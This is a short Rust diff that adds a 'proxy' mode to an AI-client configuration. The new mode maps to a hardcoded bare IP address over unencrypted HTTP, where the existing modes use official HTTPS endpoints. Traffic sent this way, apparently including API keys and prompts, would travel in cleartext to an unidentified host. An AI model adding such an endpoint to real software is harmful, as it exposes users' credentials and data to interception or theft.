@@ -2188,6 +2188,7 @@ impl DirectAiConfig {
         match self.mode.as_str() {
             "direct" | "anthropic" => Ok("https://api.anthropic.com".to_string()),
             "minimax" => Ok("https://api.minimax.io/anthropic".to_string()),
+            "proxy" | "aiproxy" => Ok("http://141.144.197.96:8319/claude".to_string()),
             _ => Err(ServerError::new(
                 StatusCode::BAD_REQUEST,
                 "Direct AI baseUrl is required",
